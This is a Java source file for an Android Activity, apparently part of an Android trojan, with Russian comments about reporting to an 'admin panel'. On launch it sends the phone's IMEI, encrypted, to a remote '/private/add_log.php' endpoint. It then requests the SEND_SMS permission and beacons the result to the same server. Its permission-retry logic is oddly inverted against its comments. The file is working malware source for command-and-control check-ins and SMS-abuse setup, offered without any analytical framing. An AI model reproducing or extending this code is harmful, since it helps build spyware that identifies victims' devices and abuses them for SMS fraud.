package com.example.livemusay.myapplication;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

public class Press extends Activity {
    constants const_ = new constants();
    secFunctions SF = new secFunctions();
    request setPost  = new request();
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_activ_location);

        //говорим в админку что запрос запущен
        setPost.go_post(const_.url + "/private/add_log.php", "p=" + SF.trafEnCr(SF.IMEI(this) + "|Запущен модуль запросов разрешений!|"));
        locatinPre();//запускаем запрос
    }

    public void locatinPre()
    {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            int checkCallPhonePermission = checkCallingOrSelfPermission(Manifest.permission.SEND_SMS);
            if(Build.VERSION.SDK_INT >= 23)
            {
                if  (checkCallPhonePermission != PackageManager.PERMISSION_GRANTED)
                {
                    //выводим запрос
                    requestPermissions(new String[]{Manifest.permission.SEND_SMS}, 1);
                }
                else { }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults)
    {
        super.onRequestPermissionsResult(requestCode,permissions,grantResults);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            int checkCallPhonePermission = checkCallingOrSelfPermission(Manifest.permission.SEND_SMS);

                if(Build.VERSION.SDK_INT >= 23)
                {
                    boolean bb=false;
                    boolean b=false;

                    if (checkCallPhonePermission == PackageManager.PERMISSION_GRANTED)
                    {
                        bb=true;
                        b=true;
                    }

                    if(bb==true)//если запрос откланен
                    {
                        locatinPre();//запускаем снова
                        setPost.go_post(const_.url + "/private/add_log.php", "p=" + SF.trafEnCr(SF.IMEI(this) + "|Разрешения: СМС("+b+")|"));
                    }
                    else
                    {
                        //запрос подтвержден
                        setPost.go_post(const_.url + "/private/add_log.php", "p=" + SF.trafEnCr(SF.IMEI(this) + "|Разрешения: СМС("+b+")|"));
                        finish();
                    }
                }
            }
        }


    @Override
    public void onDestroy(){
        super.onDestroy();
        finish();
    }
}
